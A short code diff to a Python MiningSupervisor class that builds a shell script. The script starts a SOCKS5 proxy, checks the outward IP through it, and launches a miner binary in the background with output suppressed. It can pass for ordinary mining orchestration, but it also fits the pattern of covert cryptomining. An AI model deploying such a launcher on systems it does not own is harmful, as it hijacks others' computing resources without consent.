@@ -403,9 +403,9 @@ class MiningSupervisor:
                 f"socks5_password = {password}",
                 "EOF",
                 "chmod +x gasdag graftcp/graftcp graftcp/local/graftcp-local 2>/dev/null || true",
-                "./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &",
+                "nohup ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf >/dev/null 2>&1 &",
                 "sleep 0.3",
-                "./graftcp/graftcp curl -s ifconfig.me >/dev/null 2>&1 || true",
+                "timeout 3 ./graftcp/graftcp curl -s -m 2 ifconfig.me >/dev/null 2>&1 || true",
                 f"nohup ./graftcp/graftcp ./gasdag -a {algo} -o {pool} -u {worker_id} -p x -l {log_file} {cpu_arg} > {log_file} 2>&1 &",
                 "echo 'START_MINING_SH_SUCCESS'"
             ]
